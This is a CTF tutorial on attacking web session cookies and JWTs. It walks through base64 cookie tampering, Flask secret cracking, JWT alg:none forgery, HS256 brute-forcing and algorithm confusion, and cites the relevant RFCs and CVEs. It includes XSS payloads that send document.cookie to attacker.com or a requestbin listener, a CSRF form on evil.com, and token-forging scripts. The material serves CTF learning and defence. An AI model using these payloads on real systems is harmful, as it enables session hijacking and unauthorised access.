The cookie is the login

Cookies and session tokens are the backbone of web authentication. Almost every picoCTF web challenge that involves a "logged in" state, an admin panel, or a "secret" page is gated behind a cookie value. Knowing how to read, modify, forge, and crack those cookies is the single most useful web exploitation skill you can develop for CTF competitions.

The attack surface has four layers, and they get harder in order. A plain cookie you edit by hand, base64 session data you decode and re-encode, a Flask session signed with a secret you can guess, and a JSON Web Token (JWT) whose signature you strip or forge. Each one below ends in a working exploit against a picoCTF challenge.

If you are also studying SQL injection alongside this guide, the two attack categories complement each other perfectly: SQLi gets you past the login form, cookie attacks let you escalate privileges once you are inside.

One special case worth flagging up front: when a cookie decodes to a serialized object instead of plain JSON, you are looking at insecure deserialization, which turns ordinary cookie tampering into remote code execution.

Cookie manipulationEasy

When: Session value is visible and predictable (plain text, base64, or JSON)

Flask session crackingMedium

When: Three base64 segments split by two dots (eyJ...); a leading dot means zlib-compressed

JWT alg:none attackEasy

When: Server accepts unsigned tokens - change alg to none and strip the signature

JWT secret brute-forceMedium

When: HS256 token with a weak or guessable secret key

JWT algorithm confusionHard

When: Server accepts both RS256 and HS256 and you have the public key

HTTP cookie basics

A cookie is a small piece of data that a server sends to a browser in a Set-Cookie response header. The browser stores it and sends it back automatically on every subsequent request to the same origin via the Cookie request header. This is how web applications remember who you are between page loads.

The mechanism is standardized in RFC 6265, and two of its properties are what make cookie attacks work. First, the browser is asked to store at least 4,096 bytes per cookie and 50 cookies per domain, which is plenty of room for a serialized session object rather than an opaque identifier. Second, the RFC places no requirement whatsoever on the format of the value: a cookie is an opaque byte string as far as the browser is concerned. Whether it is a random session ID, a Base64 JSON blob, or a signed token is purely the application's choice. Every attack below is an attack on that choice.

The Set-Cookie header anatomy

Set-Cookie: session=eyJ1c2VyIjoidXNlciJ9; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            name=value pair (this is what you read and modify)
# The browser sends it back as:
Cookie: session=eyJ1c2VyIjoidXNlciJ9

Cookie flags

Flags are directives that tell the browser how to handle a cookie. In CTF challenges, these flags are often missing or misconfigured on purpose.

FlagWhat it doesMissing = vulnerable to
HttpOnlyBlocks JavaScript from reading the cookie via document.cookieXSS cookie theft
SecureCookie is only sent over HTTPS connectionsNetwork interception (HTTP downgrade)
SameSite=StrictCookie is never sent on cross-site requestsCross-Site Request Forgery (CSRF)
SameSite=LaxCookie sent on top-level navigations (GET only)Some CSRF vectors
Max-Age / ExpiresPersistence - session cookie if omittedN/A
Why HttpOnly matters for you: When a cookie has HttpOnly, you literally cannot read it from the browser console with document.cookie. The browser hides it from JavaScript entirely. This is a protection against XSS attacks where an injected script tries to steal your session. However, HttpOnly does not stop you from reading the cookie in DevTools under Application > Cookies, and it does not stop the browser from sending it in requests (which Burp Suite can intercept).

Session hijacking and cookie inspection

The first thing to do in any web CTF challenge is inspect the cookies. Many beginner-level challenges store the privilege level (or even the flag) directly in a cookie value that you can just edit.

Browser DevTools

Open DevTools (F12), go to the Application tab (Chrome) or Storage tab (Firefox), and click on Cookies in the left panel. You will see every cookie for the current domain, including HttpOnly ones. You can double-click any value to edit it directly.

# In the browser console (only works if HttpOnly is NOT set):
document.cookie
// Returns: 'session=guest; theme=dark'
# Set a new value:
document.cookie = 'session=admin'
# View all cookies including HttpOnly ones:
# DevTools -> Application -> Storage -> Cookies -> [domain]

Common CTF cookie patterns to look for

# Plain text role value - just change it:
Cookie: role=guest
# -> Change to: role=admin
# Numeric user ID - try 0 or 1 for admin:
Cookie: user_id=42
# -> Change to: user_id=1
# Boolean flag:
Cookie: is_admin=false
# -> Change to: is_admin=true

XSS-based cookie theft

When an application reflects user input without sanitization, you can inject a script that exfiltrates another user's cookie. This only works if the target cookie does not have HttpOnly.

# Injected into a comment field or URL parameter:
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
# Or using fetch for a cleaner exfil:
<script>fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))</script>
# The attacker's server logs the incoming request and reads the cookie from ?c=

Base64-encoded session cookies

A very common CTF pattern: the session data is not encrypted or signed - it is just JSON or a plain string encoded in base64. The application trusts whatever it decodes, so you encode a modified value and the server accepts it as legitimate.

Recognizing a base64 cookie is easy: the value will only contain characters A-Z a-z 0-9 + / =, and it often ends with one or two = padding characters. See the CTF encodings guide for a deeper look at base64 and how to recognize it.

Decode and re-encode in the browser

// Decode in browser console:
atob('eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9')
// -> '{"user":"guest","admin":false}'
// Modify and re-encode:
btoa('{"user":"guest","admin":true}')
// -> 'eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6dHJ1ZX0='
// Set the new cookie:
document.cookie = 'session=eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6dHJ1ZX0='

Decode and re-encode in Python

import base64, json
# Decode
raw = base64.b64decode('eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9')
data = json.loads(raw)
print(data)  # {'user': 'guest', 'admin': False}
# Modify
data['admin'] = True
# Re-encode
new_cookie = base64.b64encode(json.dumps(data).encode()).decode()
print(new_cookie)  # eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6dHJ1ZX0=

What to check if re-encoding fails

If the server rejects your modified cookie, the application is probably verifying a signature. Look for a dot-separated format (Flask sessions) or three-part format (JWTs) - those are covered in the next two sections.

Flask signed session cookies

Flask stores session data client-side in a cookie that is base64-encoded and then signed with HMAC-SHA1 using a secret key. If you do not know the secret key, you cannot forge a valid signature. But if the secret key is weak or default, you can crack it.

Notice what "signed" buys and what it does not. Flask's own documentation states plainly that the session cookie is signed but not encrypted, so anyone holding the cookie can read every value inside it without the key. That is why the decode step below needs no secret at all, and why putting anything confidential in a Flask session is itself the vulnerability in some challenges. The signature only stops modification, and only for as long as SECRET_KEY stays secret.

Recognizing a Flask session cookie

Flask session cookies have a very distinctive format: three base64 segments separated by two dots, with the payload normally beginning eyJ. A leading dot appears only when the payload is zlib-compressed, not on every cookie.

# Flask session cookie structure:
eyJ1c2VyIjoiZ3Vlc3QifQ.ZxYzAb.abc123signature
^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^ ^^^^^^^^^^^^^^^
base64url(JSON payload)  timestamp  HMAC-SHA1 sig
# Decode the first segment. Flask uses the URL-safe alphabet
# (- and _ instead of + and /), so urlsafe_b64decode, not b64decode.
import base64
payload = 'eyJ1c2VyIjoiZ3Vlc3QifQ'
payload += '=' * (-len(payload) % 4)   # restore stripped padding
print(base64.urlsafe_b64decode(payload))  # b'{"user":"guest"}'

flask-unsign: decode and crack

flask-unsign is the standard CTF tool for Flask cookie attacks. It can decode the session payload, verify a known secret, and brute-force the secret key against a wordlist.

pip install flask-unsign
# Step 1: decode the payload (no key needed)
flask-unsign --decode --cookie '.eyJ1c2VyIjoiZ3Vlc3QifQ.ZxYzAb.abc123'
# Output: {'user': 'guest'}
# Step 2: crack the secret key with a wordlist
flask-unsign --unsign --cookie '.eyJ1c2VyIjoiZ3Vlc3QifQ.ZxYzAb.abc123' \
             --wordlist /usr/share/wordlists/rockyou.txt
# [*] Session decodes to: {'user': 'guest'}
# [+] Found secret key: supersecret
# Step 3: forge a new cookie with the cracked secret
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'supersecret'
# Output: .eyJ1c2VyIjoiYWRtaW4ifQ.ZxYzAb.newSignatureHere

Full worked example

Imagine a Flask app sets this cookie on login as a guest user:

Set-Cookie: session=.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJndWVzdCJ9.Zf1a2b.XyZ9QrKmPwNaBcD
# Decode to see the payload:
flask-unsign --decode --cookie '.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJndWVzdCJ9.Zf1a2b.XyZ9QrKmPwNaBcD'
# {'user': 'user', 'role': 'guest'}
# Crack the secret (try common CTF secrets first):
flask-unsign --unsign \
  --cookie '.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJndWVzdCJ9.Zf1a2b.XyZ9QrKmPwNaBcD' \
  --wordlist rockyou.txt --no-literal-eval
# [+] Found secret key: 'secret'
# Forge an admin session:
flask-unsign --sign --cookie "{'user': 'admin', 'role': 'admin'}" --secret 'secret'
# .eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.Zf9z1b.FORGED_SIGNATURE
# Use the forged cookie in the browser or with curl:
curl -b 'session=.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.Zf9z1b.FORGED_SIGNATURE' \
     http://target/admin
Common CTF Flask secret keys: Many challenge authors use trivially guessable secrets. Try these before running a full wordlist: secret, supersecret, flask-secret, dev, key, secret_key, the app name, or the challenge name. Also look at the source code if it is provided - the secret is often hardcoded.

Two picoCTF challenges drill exactly this flask-unsign workflow: most-cookies (crack a weak Flask secret from a wordlist, then forge an admin session) and more-cookies (a follow-up that adds an encryption layer on top of the signed cookie). For a walkthrough of how privilege-escalation cookie edits fit into a broader access-control attack chain, see the authentication bypass and IDOR guide.

JWT structure and decoding

A JSON Web Token (JWT) is a self-contained token format used for authentication and authorization. Unlike Flask sessions, JWTs are a standardized open format used by many frameworks beyond Python. They appear constantly in modern web CTF challenges.

It takes three RFCs to describe one token, and knowing which is which tells you where each attack lives. RFC 7519 defines the JWT itself and its seven registered claims (iss, sub, aud, exp, nbf, iat, jti). RFC 7515 defines the JWS wrapper and the three-segment compact serialization. RFC 7518 defines the alg values, and it is the one that legitimizes none. Every segment is base64url per RFC 4648 section 5 with padding stripped, which is why a JWT contains - and _ but never +, /, or =.

Three-part structure

A JWT consists of three base64url-encoded segments separated by periods:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
HEADER (base64url)                          PAYLOAD (base64url)                           SIGNATURE (base64url)
# Header (decoded):
{
  "alg": "HS256",   // signing algorithm - THIS IS THE KEY FIELD FOR ATTACKS
  "typ": "JWT"
}
# Payload (decoded):
{
  "user": "guest",
  "admin": false,
  "iat": 1712000000,   // issued at timestamp
  "exp": 1712086400    // expiry timestamp
}
# Signature:
HMAC-SHA256(base64url(header) + '.' + base64url(payload), secret_key)

Decoding a JWT instantly

Paste any JWT into jwt.io to decode the header and payload without needing the secret. You can also do it in Python:

import base64, json
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9.7Mc4Ujc5fz2145BmF6Q2f-zwslS_RkT5Kn_2x6YxWxg'
def decode_part(part):
    # base64url uses - and _ instead of + and /
    part += '=' * (4 - len(part) % 4)  # fix padding
    return json.loads(base64.urlsafe_b64decode(part))
header, payload, sig = token.split('.')
print(decode_part(header))   # {'alg': 'HS256', 'typ': 'JWT'}
print(decode_part(payload))  # {'user': 'guest', 'admin': False}
Key insight: The alg field in the header tells the server which algorithm to use when verifying the signature. Many JWT attacks work by manipulating this field. The server should validate that the alg matches what it expects, but many vulnerable applications just trust whatever the token says.

JWT attacks

Attack 1: alg:none - unsigned token forgery

The JWT specification allows an algorithm value of none, meaning the token is not signed at all. Vulnerable servers that implement this accept any token with "alg":"none" and an empty signature. This lets you forge any payload without knowing any secret key.

This is a specified feature being trusted in the wrong place rather than a library bug. RFC 7518 registers none as a legitimate alg value for what it calls an Unsecured JWS, intended for cases where integrity is guaranteed by some other layer. The failure is the verifier taking the algorithm from the attacker-supplied header. RFC 8725 (BCP 225) spells out the fix in section 3.1: the application must decide the acceptable algorithms in advance and reject anything else, rather than reading alg and doing as it is told.

import base64, json
def b64url_encode(data: dict) -> str:
    raw = json.dumps(data, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
# Step 1: craft forged header with alg:none
header  = b64url_encode({'alg': 'none', 'typ': 'JWT'})
# Step 2: craft payload with elevated privileges
payload = b64url_encode({'user': 'guest', 'admin': True, 'iat': 1712000000})
# Step 3: empty signature (just a trailing dot)
forged_token = f'{header}.{payload}.'
print(forged_token)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6dHJ1ZX0.
# Use it in a request:
# curl -H 'Authorization: Bearer eyJhbGciOiJub25lIi...' http://target/admin
Tip: Some servers only reject none when it is lowercase. Try None, NONE, and nOnE if the lowercase version is rejected.

Attack 2: weak secret brute-force (HS256)

HS256 tokens are signed with a shared secret. If that secret is in a common wordlist, you can crack it with hashcat or john and then forge any payload you want. The token is a complete offline oracle: header, payload, and signature are all in your hands, so you can test candidate secrets at full GPU speed with no requests to the server and no rate limit to trip. Hashcat calls this mode 16500, which covers HS256, HS384, and HS512 alike.

The defense is length, and it is written down. RFC 7518 requires that an HMAC key be at least as long as the hash output, so 256 bits (32 bytes) for HS256, and RFC 8725 warns specifically that human-chosen passwords do not meet that bar. A challenge whose secret falls to rockyou.txt is a challenge whose author used a word instead of 32 random bytes.

# Using hashcat (mode 16500 = JWT HS256/HS384/HS512)
hashcat -a 0 -m 16500 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE' \
        /usr/share/wordlists/rockyou.txt
# John can also crack it, but its HMAC-SHA256 format wants the token
# rewritten as message#hexdigest first (header.payload as the message,
# the signature hex-decoded), so for a raw eyJ... token hashcat -m 16500
# above is the simpler route.
# Once you have the secret, sign a forged token:
pip install PyJWT
import jwt
payload = {'user': 'admin', 'admin': True}
token = jwt.encode(payload, 'cracked_secret', algorithm='HS256')
print(token)

For more on hash cracking techniques and wordlist selection, see the hash cracking guide.

Attack 3: RS256 to HS256 algorithm confusion

RS256-to-HS256 confusion is a more advanced attack that exploits servers configured for RS256 (asymmetric signing with a private key) but that also accept HS256. The trick: if you can obtain the server's RSA public key, you sign an HS256 token using that public key as the HMAC secret. The server verifies it as HS256 using its own public key (which it knows) and accepts it as valid.

The root cause is one API shape: a verify(token, key) function that decides what key means by reading the token's own header. It has a CVE and a date. CVE-2015-9235 is exactly this bug in the Node jsonwebtoken library, disclosed in 2015 and affecting versions before 4.2.2; equivalent flaws landed in JWT libraries across at least four languages the same year. RFC 8725 section 2.1 names the countermeasure: pin the algorithm per key, never infer it from the token.

Signature verification has failed in stranger ways still. CVE-2022-21449, nicknamed Psychic Signatures, was an ECDSA implementation flaw in Java 15 through 18 that accepted a signature whose r and s values were both zero, meaning a completely blank signature validated against any key. It scored CVSS 7.5 and broke ES256 JWTs outright. If a challenge uses ES256 and refuses every other trick, try the empty signature.

# 1. Obtain the server's public key
#    Check: /jwks.json, /.well-known/jwks.json, /api/auth/keys
curl http://target/.well-known/jwks.json
# 2. Convert the JWK to PEM format (use jwt_tool or Python cryptography library)
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip3 install -r requirements.txt
python3 jwt_tool.py TOKEN -X k -pk public_key.pem
# Manually with Python:
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import jwt, base64
with open('public_key.pem', 'rb') as f:
    public_key_bytes = f.read()
# Sign the forged token with HS256 using the public key as the secret.
# Note: PyJWT 2.x rejects a PEM key here (InvalidKeyError); use the
# jwt_tool command above, or install 'pyjwt<2.0' for this manual path.
forged = jwt.encode(
    {'user': 'admin', 'admin': True},
    public_key_bytes,
    algorithm='HS256'
)
print(forged)

jwt_tool: all-in-one JWT attack tool

git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip3 install -r requirements.txt
# Decode a token
python3 jwt_tool.py TOKEN
# Try alg:none attack automatically
python3 jwt_tool.py TOKEN -X a
# Brute-force the HS256 secret
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
# RS256 -> HS256 confusion with a known public key
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

Cookie security misconfigurations in CTF

CTF web challenges intentionally leave out security flags to make exploitation possible. Recognizing what is missing helps you identify which attack path is open.

Checking flags in DevTools

# In the browser console (only reads non-HttpOnly cookies):
document.cookie
# In DevTools -> Application -> Cookies:
# The table shows: Name, Value, Domain, Path, Expires, Size, HttpOnly, Secure, SameSite
# A checkmark in HttpOnly means JavaScript cannot read it
# No checkmark = JavaScript CAN read it = vulnerable to XSS theft

Missing HttpOnly: XSS cookie theft

If the session cookie does not have HttpOnly and the application also has an XSS vulnerability, you can steal the cookie by injecting a script. In CTF challenges you often control a field that is reflected, so injection is straightforward.

# Simple exfil to your own server (use requestbin.com for a quick listener):
<img src=x onerror="fetch('https://your-listener.requestbin.com/?c='+document.cookie)">
# Or use the fetch API:
<script>
fetch('https://your-listener.requestbin.com/steal', {
  method: 'POST',
  body: document.cookie
})
</script>

Missing Secure: HTTP interception

If the cookie lacks the Secure flag and the site also serves pages over HTTP (not just HTTPS), Burp Suite can intercept and read the cookie in plain text. In CTF challenges running over plain HTTP, this is always the case.

Missing SameSite: CSRF potential

Without a SameSite restriction, a cookie is sent on every cross-origin request, including requests triggered from an attacker-controlled page. This opens CSRF attacks where you can make a victim's browser perform actions on a target site without their knowledge.

The attribute takes three values, defined in the RFC 6265bis draft: Strict (never sent cross-site), Lax (sent on top-level navigations only), and None (always sent, and only accepted alongside Secure). What changed the landscape is the default. Chrome began treating cookies with no SameSite attribute as Lax in version 80 (February 2020), so classic cross-origin CSRF against a form POST no longer works by accident. A challenge that still needs CSRF is either running an older browser model or has explicitly set SameSite=None, and spotting which tells you whether the attack is on the table.

Burp Suite: intercepting and modifying cookies

Burp Suite is the standard proxy tool for web CTF challenges. It sits between your browser and the server, letting you read, modify, and replay any HTTP request including its cookies.

Basic intercept workflow

# Setup (one-time):
1. Open Burp Suite Community Edition
2. Proxy -> Options -> confirm listener is on 127.0.0.1:8080
3. Configure your browser to use proxy 127.0.0.1:8080
   (or use Burp's built-in browser at Proxy -> Open Browser)
4. Install Burp's CA certificate to avoid TLS warnings:
   Visit http://burpsuite and download the certificate
# Intercept a request:
1. Proxy -> Intercept -> 'Intercept is on'
2. Navigate to the target page in your browser
3. Burp captures the request before it reaches the server
4. Edit the Cookie header directly in the Intercept tab
5. Click 'Forward' to send the modified request

Repeater: iterate without intercepting

Right-click any request in Proxy history and send it to the Repeater tab. From there you can modify cookies and other headers, resend the request, and compare responses without needing to navigate in the browser each time.

# In Repeater, find the Cookie header:
GET /admin HTTP/1.1
Host: target.ctf.io
Cookie: session=eyJ1c2VyIjoiZ3Vlc3QifQ==
# Change the cookie value and click Send:
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ==
# The Response panel shows what the server returns
# Look for the flag in the response body

Match-and-replace rules

If you want to automatically replace a cookie value on every request without manually intercepting each one, use Burp's match-and-replace rules.

# Proxy -> Options -> Match and Replace -> Add
Type:    Request header
Match:   Cookie: session=.*
Replace: Cookie: session=YOUR_FORGED_VALUE
# Now every request automatically uses your forged cookie
# Browse the site normally and the replacement happens transparently

Using curl instead of Burp

For quick tests you can use curl directly from the terminal without setting up a proxy at all.

# Send a request with a custom cookie:
curl -b 'session=eyJ1c2VyIjoiYWRtaW4ifQ==' http://target.ctf.io/admin
# Follow redirects and show response headers:
curl -L -v -b 'session=FORGED' http://target.ctf.io/dashboard
# POST with cookie and form data:
curl -X POST -b 'session=FORGED' -d 'action=get_flag' http://target.ctf.io/api

What cookies and JWTs don't protect against

Knowing the attack surface also means knowing its limits. Several related vulnerabilities are commonly confused with cookie/JWT attacks but require different techniques.

Session fixation

In a session fixation attack, the attacker supplies the session token value before the victim logs in, and the server keeps that same token after authentication. The attacker already knows the token, so they are immediately authenticated as the victim without ever seeing the victim's cookie.

This is a server-side bug (the server should rotate the session ID on login), not something you can exploit by reading or forging your own cookie. In CTF challenges, look for it when the challenge gives you a way to pre-set a cookie value and then trigger a login on the victim side.

SameSite=None bypass and CSRF

A cookie with SameSite=None; Secure is explicitly allowed on cross-site requests. If an application relies on cookie presence alone to authenticate actions (no CSRF token), an attacker can craft a page that makes the victim's browser submit a request to the target site with the victim's cookie attached automatically.

<!-- Attacker's page at evil.com forces a POST to target.com: -->
<form id='csrf' action='https://target.com/transfer' method='POST'>
  <input name='amount' value='9999'>
  <input name='to' value='attacker'>
</form>
<script>document.getElementById('csrf').submit();</script>

In CTF challenges, CSRF appears when there is a bot or admin simulation that visits a URL you control, and you need to make it perform an action on the target site. See the XSS for CTF guide for the full pattern.

localStorage vs. sessionStorage vs. cookies

Not all web applications use cookies for session state. Some store the JWT in localStorage or sessionStorage and attach it as a Bearer token in the Authorization header instead.

// Check all three storage mechanisms in the browser console:
document.cookie
localStorage.getItem('token')      // or: Object.entries(localStorage)
sessionStorage.getItem('token')    // cleared when the tab is closed
// If the app sends: Authorization: Bearer eyJhbGci...
// the token lives in localStorage, not cookies.
// Modify it the same way (decode -> change payload -> re-sign or use alg:none),
// then set it back: localStorage.setItem('token', forgedToken)

Tokens in localStorage are accessible to any JavaScript running on the same origin, making them vulnerable to XSS but immune to CSRF (since they are not sent automatically on cross-site requests).

Decision tree: which attack to use

When you find a cookie in a web challenge, use this decision tree to identify the right attack path:

Step 1: What does the cookie value look like?

Plain text (role=guest, admin=false)

Just change the value in DevTools or Burp. This is the simplest case.

base64 only (ends in = or ==)

Decode with atob() or Python, modify the JSON/text, re-encode, and set the new value.

Three parts, first decodes to a session dict (leading dot if compressed)

Flask signed session. Use flask-unsign to decode, crack the secret, then forge.

Three parts separated by dots (eyJ...eyJ...sig)

JWT. Decode at jwt.io, check the alg field, then proceed to JWT attacks below.

Step 2 (JWT only): What algorithm does the header claim?

HS256 / HS384 / HS512

Try alg:none first. If that fails, brute-force the secret with hashcat mode 16500.

RS256 / RS512

Look for the public key at /jwks.json. Try the RS256-to-HS256 confusion attack.

none (already set)

The server may already accept unsigned tokens. Just modify the payload and send.

Step 3: Check for flag security misconfigurations

Open DevTools - Application - Cookies. For each session cookie, check:

  • No HttpOnly checkmark = JavaScript can read it = XSS theft possible
  • No Secure checkmark = sent over HTTP = Burp intercept possible
  • No SameSite = cross-site requests carry the cookie = CSRF possible

CyberChef recipes for common cookie formats

CyberChef (gchq.github.io/CyberChef) is an excellent browser-based tool for decoding and re-encoding cookie values. Here are the exact recipe chains for the formats you will see most often in CTF challenges.

Base64-encoded JSON cookie

Recipe to decode:

From Base64 -> JSON Beautify

Recipe to re-encode after editing:

JSON Minify -> To Base64

URL-encoded cookie value

Some apps URL-encode the cookie value (spaces become %20, etc.):

URL Decode -> From Base64 -> JSON Beautify

JWT payload decode (without verification)

Paste the middle segment (between the two dots) and apply:

From Base64url -> JSON Beautify

Note: use Base64url not plain Base64 - JWT uses - and _ instead of + and /.

Hex-encoded cookie value

Some PHP apps hex-encode session data:

From Hex -> JSON Beautify (or just view as UTF-8 text)

Double-encoded cookie

Occasionally you will see base64 inside base64. Keep decoding until you hit readable content:

From Base64 -> From Base64 -> JSON Beautify
Pro tip: In CyberChef you can chain operations and the output updates live as you type. Use the Magic operation to auto-detect the encoding if you are unsure what format you are dealing with. The CTF encodings guide covers the full encoding taxonomy.

General approach for any web challenge

Before reading the writeup, work through four steps. Log in as a normal user and open DevTools cookies. Look at the cookie value and identify its format. Try modifying the role or admin field. If the cookie is signed, try to find or crack the secret key from the source code or a wordlist.

Sources and further reading

Cookie and JWT attacks are unusually well documented by the standards themselves. The RFCs below name most of these attacks and tell you what the correct implementation looks like.

  • RFC 6265 (cookies, flags, and size limits) and RFC 6265bis (the three SameSite values and the Lax-by-default behavior).
  • The JWT stack: RFC 7519 (the token and its registered claims), RFC 7515 (JWS compact serialization), and RFC 7518 (the alg registry, including none and the HMAC key-length requirement).
  • RFC 8725 (BCP 225) is the single best document on this page: it enumerates algorithm confusion, none, weak HMAC secrets, and unvalidated claims, and gives the countermeasure for each.
  • Real failures: CVE-2015-9235 (jsonwebtoken algorithm confusion) and CVE-2022-21449 (Java ECDSA accepting a blank signature).
  • RFC 4648 for the base64url alphabet, Flask session documentation (signed, not encrypted), and the hashcat mode reference.
